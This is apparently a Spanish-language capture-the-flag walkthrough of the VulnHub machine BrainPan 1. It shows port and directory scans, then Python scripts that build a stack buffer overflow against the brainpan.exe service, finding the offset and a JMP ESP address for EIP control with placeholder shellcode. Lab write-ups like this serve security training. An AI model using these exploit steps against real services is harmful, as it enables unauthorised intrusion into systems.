# BrainPan1
Desarrrollo del CTF BrainPan 1. Download: https://www.vulnhub.com/entry/brainpan-1,51/ 

## Escaneo de Puertos
``` 
root@kali:~# nmap --disable-arp-ping -n -P0 -p- -T5 -O -sV 192.168.78.134
Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-09 16:40 EST
Nmap scan report for 192.168.78.134
Host is up (0.00096s latency).
Not shown: 65533 closed ports
PORT      STATE SERVICE VERSION
9999/tcp  open  abyss?
10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
SF-Port9999-TCP:V=7.80%I=7%D=2/9%Time=6023014A%P=x86_64-pc-linux-gnu%r(NUL
SF:L,298,"_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\|_\|\
SF:x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x
SF:20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_\|\x2
SF:0\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x2
SF:0\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x2
SF:0\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x20_\|\
SF:x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x2
SF:0_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x2
SF:0_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x20\x2
SF:0\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20_\
SF:|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|_\|\x20\x20\x20\x20\x20\x2
SF:0_\|_\|_\|\x20\x20_\|\x20\x20\x20\x20_\|\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20_\|\n\n\[________________________\x20WELCOME\x20TO\x20BRAINPAN\x2
SF:0_________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ENTER\x2
SF:0THE\x20PASSWORD\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\n\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20>>\x20");
MAC Address: 00:0C:29:C4:1E:F9 (VMware)
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.10

``` 
<img src="https://github.com/El-Palomo/BrainPan1/blob/main/image.png" width="60%"></img>


## Enumeracion de Carpetas 

```
root@kali:~# gobuster dir -u http://192.168.78.134:10000/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.78.134:10000/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-1.0.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/02/09 17:01:30 Starting gobuster
===============================================================
/bin (Status: 301)
===============================================================
2021/02/09 17:02:57 Finished
===============================================================

```
<img src="https://github.com/El-Palomo/BrainPan1/blob/main/brain2.jpg" width="60%"></img>

## Buffer Overflow Windows

### Fuzzing
```
import sys, socket
import struct

buf = "A" * 1024

target = ('127.0.0.1', 9999)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(target)
s.recv(1024)
s.send(payload)
s.recv(1024)
s.close()
```
<img src="https://github.com/El-Palomo/BrainPan1/blob/main/brain3.jpg" width="60%"></img>

### Calculando el OFFSET
```
root@kali:~# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1024
```
Creamos un patron para identificar el OFFSET

```
import sys, socket
import struct

pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0B"

buf = "A" * 1024


target = ('127.0.0.1', 9999)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(target)
s.recv(1024)
s.send(pattern)
s.recv(1024)
s.close()
```
<img src="https://github.com/El-Palomo/BrainPan1/blob/main/brain4.jpg" width="60%"></img>


```
root@kali:~# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x35724134
[*] Exact match at offset 524
```


```
import sys, socket
import struct

buf = "A" * 524
ret = "BBBB"
nops = "\x90" * 32
shell = "\xCC"

payload = buf + ret + nops + shell

target = ('127.0.0.1', 9999)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(target)
s.recv(1024)
s.send(payload)
s.recv(1024)
s.close()
```
<img src="https://github.com/El-Palomo/BrainPan1/blob/main/brain5.jpg" width="60%"></img>

### Controlando Registro EIP

#### Obtenemos el JMP ESP
```
!mona modules
```
<img src="https://github.com/El-Palomo/BrainPan1/blob/main/brain6.jpg" width="60%"></img>


Debido a que el TARGET final es un LINUX escogemos el modulo:
```
!mona find -type instr -s "jmp esp" -m brainpan.exe
```
<img src="https://github.com/El-Palomo/BrainPan1/blob/main/brain7.jpg" width="60%"></img>

```
import sys, socket
import struct

buf = "A" * 524
ret = struct.pack("I", 0x311712F3)
nops = "\x90" * 32
shell = "\xCC"

payload = buf + ret + nops + shell

target = ('127.0.0.1', 9999)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(target)
s.recv(1024)
s.send(payload)
s.recv(1024)
s.close()
```


